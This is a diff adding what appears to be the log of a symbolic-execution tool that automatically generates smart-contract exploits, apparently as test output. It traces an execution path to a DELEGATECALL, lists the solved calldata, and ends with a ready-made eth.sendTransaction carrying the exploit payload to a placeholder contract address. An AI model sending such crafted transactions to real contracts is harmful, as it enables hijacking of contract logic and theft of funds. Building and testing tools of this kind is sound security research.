@@ -1,0 +1,27 @@
+INFO:root:Finished all paths
+INFO:root:No CALL instructions
+INFO:root:Found 1 DELEGATECALL instructions
+INFO:root:Finished all paths
+INFO:root:DELEGATECALL: (  337)  151:	f4	-6 +1 = -5	DELEGATECALL
+INFO:root:Path: 0->d->46->52->cf->f9->114->141->151
+[CALLVALUE_0 = 0,
+ CALLDATASIZE_0 = 68,
+ CALLER_0 = 4660,
+ CALLDATA_0 = Store(Store(Store(Store(Store(Store(K(BitVec(256),
+                                        0),
+                                        3,
+                                        114),
+                                        0,
+                                        111),
+                                      2,
+                                      207),
+                                34,
+                                16),
+                          1,
+                          173),
+                    67,
+                    31),
+ ORIGIN_0 = 4660]
+0: 0->d->46->52->cf->f9->114->141->151
+[{'value': 0, 'caller': 4660, 'origin': 4660, 'payload': b'o\xad\xcfr\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f'}]
+eth.sendTransaction({from:"0x0000000000000000000000000000000000001234", data:"0x6fadcf720000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000001f", to:"0x4000000000000000000000000000000000000000", gasPrice:0})
